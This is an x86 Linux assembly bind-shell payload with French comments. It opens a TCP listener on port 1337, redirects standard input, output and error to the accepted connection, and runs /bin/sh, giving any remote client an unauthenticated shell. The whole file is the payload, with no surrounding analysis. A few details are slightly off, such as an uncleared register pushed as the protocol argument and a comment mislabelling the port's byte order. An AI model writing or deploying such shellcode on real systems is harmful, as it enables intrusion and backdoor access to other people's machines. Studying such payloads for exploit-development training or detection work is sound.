section .text
    global _start

_start:
    ; 1. Création du socket
    xor eax, eax        ; RAZ de eax
    xor ebx, ebx        ; RAZ de ebx
    mov al, 0x66        ; syscall socketcall
    mov bl, 0x1         ; SYS_SOCKET (création de socket)
    push ecx            ; Protocole (0 = IPPROTO_IP)
    push 0x1            ; Type (1 = SOCK_STREAM)
    push 0x2            ; Domaine (2 = AF_INET)
    mov ecx, esp        ; Pointeur vers les arguments
    int 0x80            ; Appel système
    mov esi, eax        ; Sauvegarde du descripteur de socket

    ; 2. Configuration du socket (bind)
    mov al, 0x66        ; syscall socketcall
    mov bl, 0x2         ; SYS_BIND (liaison du socket)
    push 0x00000000     ; Adresse IP (0.0.0.0 pour écouter sur toutes les interfaces)
    push word 0x3905    ; Port (1337 en hexadécimal, ordre little-endian)
    push word 0x2       ; Famille d'adresses (AF_INET)
    mov ecx, esp        ; Pointeur vers la structure sockaddr
    push 0x10           ; Taille de sockaddr (16 octets)
    push ecx            ; Pointeur vers sockaddr
    push esi            ; Descripteur de socket
    mov ecx, esp        ; Pointeur vers les arguments
    int 0x80            ; Appel système

    ; 3. Mise en écoute du socket (listen)
    mov al, 0x66        ; syscall socketcall
    mov bl, 0x4         ; SYS_LISTEN (mise en écoute)
    push 0x1            ; Taille de la file d'attente
    push esi            ; Descripteur de socket
    mov ecx, esp        ; Pointeur vers les arguments
    int 0x80            ; Appel système

    ; 4. Acceptation des connexions (accept)
    mov al, 0x66        ; syscall socketcall
    mov bl, 0x5         ; SYS_ACCEPT (acceptation des connexions)
    push ecx            ; NULL pour sockaddr
    push ecx            ; NULL pour socklen_t
    push esi            ; Descripteur de socket
    mov ecx, esp        ; Pointeur vers les arguments
    int 0x80            ; Appel système
    mov edi, eax        ; Sauvegarde du descripteur de connexion

    ; 5. Redirection des entrées/sorties vers le socket (dup2)
    xor ecx, ecx        ; RAZ de ecx
    mov cl, 0x2         ; Compteur pour les descripteurs de fichiers (stdin, stdout, stderr)
dup2_loop:
    mov al, 0x3f        ; syscall dup2
    mov ebx, edi        ; Descripteur de connexion
    int 0x80            ; Appel système
    dec ecx             ; Décrémente le compteur
    jns dup2_loop       ; Répète pour stdin (0), stdout (1), stderr (2)

    ; 6. Exécution de /bin/sh (execve)
    xor eax, eax        ; RAZ de eax
    push eax            ; Fin de chaîne (NULL)
    push 0x68732f2f     ; "//sh"
    push 0x6e69622f     ; "/bin"
    mov ebx, esp        ; Pointeur vers "/bin//sh"
    push eax            ; NULL pour envp
    push ebx            ; Pointeur vers "/bin//sh"
    mov ecx, esp        ; Pointeur vers argv
    mov al, 0x0b        ; syscall execve
    int 0x80            ; Appel système